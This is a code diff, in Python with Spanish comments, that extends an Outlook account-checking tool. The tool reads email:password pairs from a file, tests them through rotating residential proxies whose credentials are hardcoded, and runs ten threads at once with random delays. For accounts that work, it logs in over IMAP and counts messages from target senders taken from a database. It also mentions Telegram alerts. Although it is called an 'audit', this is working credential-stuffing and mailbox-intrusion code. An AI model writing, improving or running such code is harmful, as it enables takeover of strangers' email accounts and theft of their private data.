@@ -78,51 +78,62 @@ def get_target_senders_from_db():
     except:
         return []
 
-def search_inbox_imap(email_addr, password, keyword, proxy_dict=None):
+def search_inbox_imap(email_addr, password, target_senders):
     """
     Usa IMAP con las credenciales ya verificadas para buscar en el buzón.
-    Retorna (senders_dict, total_count)
-    outlook.com/hotmail.com soporta Basic Auth IMAP para cuentas consumer.
+    Busca específicamente cuántos correos hay de cada target_sender.
     """
     senders_found = {}
     subject_count = 0
     try:
-        # Conectar a Outlook IMAP (soporta basic auth en cuentas personales)
+        print(f"[DEBUG IMAP {email_addr}] Conectando a imap-mail.outlook.com...")
         mail = imaplib.IMAP4_SSL('imap-mail.outlook.com', 993)
         mail.login(email_addr, password)
         mail.select('INBOX')
+        print(f"[DEBUG IMAP {email_addr}] Login exitoso. Buscando remitentes objetivo...")
         
-        # En lugar de buscar un texto que no está en los correos (como el nombre de la carpeta),
-        # obtenemos los últimos N correos y vemos quién los manda.
-        _, data = mail.search(None, 'ALL')
-        msg_ids = data[0].split() if data[0] else []
-        
-        # Tomar los últimos 50 mensajes (o menos si hay pocos)
-        recent_msg_ids = msg_ids[-50:]
-        subject_count = len(recent_msg_ids)
-        
-        # Extraer remitentes de los mensajes recientes
-        for msg_id in recent_msg_ids:
-            try:
-                _, msg_data = mail.fetch(msg_id, '(BODY.PEEK[HEADER.FIELDS (FROM)])')
-                if msg_data and msg_data[0] and isinstance(msg_data[0], tuple):
+        if not target_senders:
+            print(f"[DEBUG IMAP {email_addr}] No hay target_senders definidos. Obteniendo últimos 10.")
+            _, data = mail.search(None, 'ALL')
+            msg_ids = data[0].split() if data[0] else []
+            for msg_id in msg_ids[-10:]:
+                try:
+                    _, msg_data = mail.fetch(msg_id, '(BODY.PEEK[HEADER.FIELDS (FROM)])')
                     raw = msg_data[0][1].decode('utf-8', errors='replace')
                     m = re.search(r'[\w\.\+\-]+@[\w\.\-]+\.[a-zA-Z]{2,}', raw)
                     if m:
                         sender = m.group(0).lower()
                         senders_found[sender] = senders_found.get(sender, 0) + 1
-            except:
-                continue
-                
+                except:
+                    pass
+            subject_count = len(msg_ids[-10:])
+        else:
+            # Buscar cada target_sender específicamente
+            for ts in target_senders:
+                try:
+                    clean_ts = ts.strip().lower()
+                    if not clean_ts: continue
+                    # Buscar mensajes FROM este remitente
+                    _, data = mail.search(None, 'FROM', f'"{clean_ts}"')
+                    msg_ids = data[0].split() if data[0] else []
+                    count = len(msg_ids)
+                    if count > 0:
+                        senders_found[clean_ts] = count
+                        subject_count += count
+                        print(f"[DEBUG IMAP {email_addr}] Encontrado {count} de {clean_ts}")
+                except Exception as e:
+                    print(f"[DEBUG IMAP {email_addr}] Error buscando {ts}: {e}")
+                    
         mail.logout()
-        
-        # Ordenar remitentes por frecuencia y tomar los top 15
+        # Tomar los top 15
         top_senders = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
         senders_found = top_senders
+        print(f"[DEBUG IMAP {email_addr}] Búsqueda terminada. Encontrados: {senders_found}")
+        
     except imaplib.IMAP4.error as e:
-        pass  # Credenciales inválidas para IMAP o cuenta no soporta IMAP
+        print(f"[DEBUG IMAP {email_addr}] Error de credenciales o IMAP deshabilitado: {e}")
     except Exception as e:
-        pass
+        print(f"[DEBUG IMAP {email_addr}] Error general IMAP: {e}")
         
     return senders_found, subject_count
 
@@ -258,7 +269,7 @@ class DummyQueue:
     def put(self, item):
         pass # Silenciamos el log detallado por credencial en este nivel para no trabar la consola CMD
 
-def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
+def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target_senders=None):
     """
     Ejecuta el chequeo de Microsoft Outlook de forma local desde el VPS.
     Si el resultado es HIT, lo anexa a hits_buffer de forma thread-safe.
@@ -354,7 +365,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
             # --- BÚSQUEDA REAL EN BUZÓN VÍA IMAP ---
             # Usamos las credenciales (email+pass) ya verificadas con IMAP Basic Auth
             # Outlook.com/Hotmail.com soporta esto para cuentas consumer
-            senders_found, subject_count = search_inbox_imap(email, password, keyword, proxy_dict)
+            senders_found, subject_count = search_inbox_imap(email, password, target_senders)
             
             owa_canary = session.cookies.get("X-OWA-CANARY") or ""
             api_headers["X-OWA-CANARY"] = owa_canary
@@ -592,13 +603,16 @@ def process_file_and_scan(file_path, keyword=""):
     except Exception as e:
         print(f"Error alerting start telegram: {e}")
 
+    # Cargar los remitentes objetivo desde la BD una sola vez
+    target_senders_list = get_target_senders_from_db()
+    
     def scan_cred_worker(cred):
         email, pwd = cred.split(':', 1)
         iproyal_auth = {
             "http": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321",
             "https": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
         }
-        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword)
+        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword, target_senders_list)
         time.sleep(random.uniform(0.5, 1.2))
 
     # 🔥 TURBO MODE: 10 hilos en paralelo ejecutados localmente
